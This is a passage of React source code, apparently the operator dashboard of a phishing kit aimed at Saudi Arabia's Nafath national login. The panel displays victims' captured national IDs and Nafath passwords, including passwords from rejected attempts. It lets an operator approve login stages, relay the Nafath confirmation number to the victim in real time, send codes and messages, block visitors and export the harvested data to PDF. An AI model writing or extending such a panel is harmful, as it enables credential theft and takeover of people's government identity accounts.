                  onReject={() => onStageReject(order.id)}
                  loading={loadingAction}
                  approveKey={`stage-approve-${order.id}`}
                  rejectKey={`stage-reject-${order.id}`}
                />
              ) : undefined}
            >
              {phone ? <InfoItem label="رقم الجوال" value={phone} /> : <p className="text-[10px] text-muted-foreground text-center">بانتظار البيانات...</p>}
            </DataCard>
          );
        })()}

        {/* ──────── 11. دخول نفاذ ──────── */}
        {order && isStageReached("nafath_login") && (() => {
          const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
          const rejected = events.filter(e => e.status === "rejected");
          const latestEvent = events.at(-1);
          const payloadNatId = (latestEvent?.payload as any)?.national_id;
          const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
          const nationalId = order.nafath_password ? (order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId) : (payloadNatId || null);
          const password = order.nafath_password || payloadPassword || null;
          const previewNationalId = nationalId || selectedVisitor?.national_id || order.national_id || visitorNationalId;

          return (
            <DataCard
              title="دخول نفاذ"
              icon={<Fingerprint className="w-4 h-4" />}
              color="teal"
              badge={isStageActive("nafath_login") ? <PendingBadge /> : <StatusBadge status={getStageStatus("nafath_login")} />}
              actions={isStageActive("nafath_login") ? (
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
                    <input type="text" placeholder="مثل 35" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value)} className="flex-1 h-7 rounded-lg border border-border bg-card px-2 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors" />
                  </div>
                  <ApproveRejectButtons
                    onApprove={() => onStageApprove(order.id, getNafathInputValue(order))}
                    onReject={() => onStageReject(order.id)}
                    loading={loadingAction}
                    approveKey={`stage-approve-${order.id}`}
                    rejectKey={`stage-reject-${order.id}`}
                    disabled={!getNafathInputValue(order)}
                  />
                </div>
              ) : undefined}
            >
              {rejected.map((ev, i) => (
                <div key={ev.id} className="bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1 space-y-0.5">
                  <span className="text-[10px] text-red-500">محاولة {i + 1} (مرفوض)</span>
                  <div className="grid grid-cols-2 gap-1">
                    <div><p className="text-[8px] text-red-400">الهوية</p><p className="text-[10px] font-mono text-red-400 line-through">{(ev.payload as any)?.national_id || "—"}</p></div>
                    <div><p className="text-[8px] text-red-400">كلمة المرور</p><p className="text-[10px] font-mono text-red-400 line-through">{(ev.payload as any)?.nafath_password || "—"}</p></div>
                  </div>
                </div>
              ))}
              <div className="grid grid-cols-1 gap-1.5">
                <InfoItem label="اسم المستخدم (الهوية)" value={previewNationalId || "—"} />
                <InfoItem label="كلمة المرور" value={password || "بانتظار..."} />
              </div>
              {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
            </DataCard>
          );
        })()}

        {/* ──────── 12. رمز نفاذ ──────── */}
        {order && isStageReached("nafath_verify") && (() => {
          const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_verify").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
          const rejected = events.filter(e => e.status === "rejected");

          return (
            <DataCard
              title="رمز نفاذ"
              icon={<span className="text-sm">🔐</span>}
              color="cyan"
              badge={isStageActive("nafath_verify") ? <PendingBadge /> : <StatusBadge status={getStageStatus("nafath_verify")} />}
              actions={isStageActive("nafath_verify") ? (
                <div className="space-y-2">
                  <Button
                    onClick={() => {
                      const val = getNafathInputValue(order);
                      if (!val) { toast.info("أدخل الرقم أولاً"); return; }
                      onUpdateNafathNumber(order.id, val);
                    }}
                    disabled={loadingAction !== null || !getNafathInputValue(order)}
                    className="w-full bg-cyan-600 hover:bg-cyan-700 text-white gap-1"
                    size="sm"
                  >
                    {loadingAction === `nafath-update-${order.id}` ? <Loader2 className="w-3 h-3 animate-spin" /> : <RefreshCw className="w-3 h-3" />}
                    {order.nafath_number ? "تحديث الرقم" : "إرسال الرقم للزائر"}
                  </Button>
                  <ApproveRejectButtons
                    onApprove={() => onStageApprove(order.id, getNafathInputValue(order))}
                    onReject={() => onStageReject(order.id)}
                    loading={loadingAction}
                    approveKey={`stage-approve-${order.id}`}
                    rejectKey={`stage-reject-${order.id}`}
                    disabled={!getNafathInputValue(order)}
                  />
                </div>
              ) : undefined}
            >
              {rejected.map((ev, i) => (
                <div key={ev.id} className="flex items-center justify-between bg-red-500/5 border border-red-500/15 rounded-lg px-2.5 py-1">
                  <span className="text-[10px] text-red-500">محاولة {i + 1}</span>
                  <span className="text-sm font-mono font-bold tracking-[4px] text-red-400 line-through">{(ev.payload as any)?.nafath_number || "—"}</span>
                </div>
              ))}
              <div className="flex items-center gap-2">
                <span className="text-[10px] text-muted-foreground whitespace-nowrap">أدخل الرقم:</span>
                <input type="text" inputMode="numeric" placeholder="مثال: 35" value={getNafathInputValue(order)} onChange={e => setNafathInputValue(order.id, e.target.value.replace(/\D/g, ""))} className="flex-1 h-8 rounded-lg border border-border bg-card px-2.5 text-lg text-foreground text-center font-bold tracking-[6px] focus:border-primary focus:outline-none transition-colors" />
              </div>
              {order.nafath_number && (
                <div className="flex items-center justify-between bg-cyan-500/10 rounded-lg px-2.5 py-1.5">
                  <span className="text-[9px] text-cyan-600">الرقم المعروض:</span>
                  <span className="text-base font-mono font-bold tracking-[4px] text-cyan-600">{order.nafath_number}</span>
                </div>
              )}
              {rejected.length >= 3 && <p className="text-[9px] text-red-500 text-center font-bold">⚠ تم استنفاد المحاولات</p>}
            </DataCard>
          );
        })()}

        {/* ──────── 13. المحادثة ──────── */}
        {linkedChats.length > 0 && (
          <DataCard title="المحادثة" icon={<MessageCircle className="w-4 h-4" />} color="rose">
            <AdminVisitorChat visitorSessionId={selectedVisitor.session_id} visitorName={selectedVisitor.visitor_name} />
          </DataCard>
        )}

        {/* ──────── Actions Bar ──────── */}
        <div className="space-y-2.5 bg-card border border-border rounded-xl p-3 md:p-4">
          {/* Send Code */}
          <div className="flex items-center gap-2">
            <span className="text-xs text-muted-foreground whitespace-nowrap">إرسال رمز</span>
            <input type="text" placeholder="أدخل الرمز" value={codeInput} onChange={e => setCodeInput(e.target.value)} className="flex-1 h-9 px-3 text-sm bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground" />
            <button onClick={() => { if (codeInput.trim() && onSendCode) { onSendCode(codeInput.trim()); setCodeInput(""); } }} disabled={!codeInput.trim()} className="h-9 px-4 rounded-lg text-xs font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all inline-flex items-center gap-1.5">
              <KeyRound className="w-3.5 h-3.5" />إرسال
            </button>
          </div>
          {/* Send Final Message */}
          <div className="flex items-center gap-2">
            <span className="text-xs text-muted-foreground whitespace-nowrap">رسالة نهائية</span>
            <input type="text" placeholder="أدخل الرسالة" value={messageInput} onChange={e => setMessageInput(e.target.value)} className="flex-1 h-9 px-3 text-sm bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground" />
            <button onClick={() => { if (messageInput.trim() && onSendFinalMessage) { onSendFinalMessage(messageInput.trim()); setMessageInput(""); } }} disabled={!messageInput.trim()} className="h-9 px-4 rounded-lg text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 transition-all inline-flex items-center gap-1.5">
              <Send className="w-3.5 h-3.5" />إرسال
            </button>
          </div>
          {/* Block + Export */}
          <div className="flex items-center gap-2 pt-1">
            <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`h-9 px-5 rounded-lg text-xs font-bold transition-all inline-flex items-center gap-1.5 ${selectedVisitor.is_blocked ? "bg-muted text-muted-foreground hover:bg-muted/80" : "bg-destructive text-destructive-foreground hover:bg-destructive/90"}`}>
              {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3.5 h-3.5" />فك الحظر</> : <><Ban className="w-3.5 h-3.5" />حظر</>}
            </button>
            <button onClick={onExportPDF} className="h-9 px-4 rounded-lg text-xs font-bold bg-muted/50 text-muted-foreground border border-border hover:bg-muted transition-all inline-flex items-center gap-1.5 mr-auto">
              <Download className="w-3.5 h-3.5" />تصدير PDF
            </button>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

export default VisitorDetailsPanel;
